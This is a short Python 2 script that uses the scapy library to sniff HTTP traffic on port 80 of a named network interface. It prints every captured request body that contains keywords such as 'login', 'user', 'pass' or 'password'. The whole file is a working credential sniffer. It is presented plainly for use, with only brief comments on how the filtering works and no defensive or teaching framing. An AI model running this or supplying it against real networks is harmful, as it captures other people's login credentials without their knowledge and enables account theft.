#!/usr/bin/python2
#filtering with 3 rd party module scap_http for request method
#filter only creditials which contains login, username, password as keyword

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):

	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet,filter = "port 80")

def process_sniffed_packet(packet):

	if packet.haslayer(http.HTTPRequest):
		if packet.haslayer(scapy.Raw):

			load = packet[scapy.Raw].load
			keywords = ['login','LOGIN','user','pass','username','password','Login']

			for keyword in keywords:
				if keyword in load:
					print load
					break

			
sniff('wlp3s0')